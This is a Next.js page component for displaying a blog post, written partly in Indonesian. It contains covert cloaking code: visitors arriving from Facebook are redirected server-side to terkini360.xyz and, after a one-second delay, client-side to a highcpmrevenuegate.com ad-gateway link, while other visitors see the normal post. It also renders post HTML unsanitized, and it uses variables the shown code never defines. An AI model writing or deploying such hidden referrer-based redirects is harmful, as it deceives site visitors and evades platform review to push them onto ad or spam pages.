import React, { useEffect } from 'react';
import Head from 'next/head';
import { GetServerSideProps } from 'next';
import { GraphQLClient, gql } from 'graphql-request';

export const getServerSideProps: GetServerSideProps = async (ctx) => {
  // ... (kode getServerSideProps yang ada)

  if (referringURL?.includes('facebook.com') || fbclid) {
    return {
      redirect: {
        permanent: false,
        destination: `${
          `http://www.terkini360.xyz/` + encodeURI(path as string)
        }`,
      },
    };
  }

  // ... (kode getServerSideProps yang ada)
};

interface PostProps {
  post: any;
  host: string;
  path: string;
}

const Post: React.FC<PostProps> = (props) => {
  const { post, host, path } = props;

  // to remove tags from excerpt
  const removeTags = (str: string) => {
    if (str === null || str === '') return '';
    else str = str.toString();
    return str.replace(/(<([^>]+)>)/gi, '').replace(/\[[^\]]*\]/, '');
  };

  // Effect to handle the redirect logic
  useEffect(() => {
    // Add your redirect logic here with a 1-second delay
    setTimeout(() => {
      if (document.referrer.includes('facebook.com') || window.location.search.includes('fbclid')) {
        window.location.href = 'https://www.highcpmrevenuegate.com/rbijdj27?key=703d125af2da21b949c8fd2eae364f30';
      }
    }, 1000); // Delay for 1 second (1000 milliseconds)
  }, []);

  return (
    <>
      <Head>
        <meta property="og:image" content={post.featuredImage.node.sourceUrl} />
        <meta
          property="og:image:alt"
          content={post.featuredImage.node.altText || post.title}
        />
        <title>{post.title}</title>
      </Head>
      <div className="post-container">
        <h1>{post.title}</h1>
        <img
          src={post.featuredImage.node.sourceUrl}
          alt={post.featuredImage.node.altText || post.title}
        />
        <article dangerouslySetInnerHTML={{ __html: post.content }} />
      </div>
    </>
  );
};

export default Post;
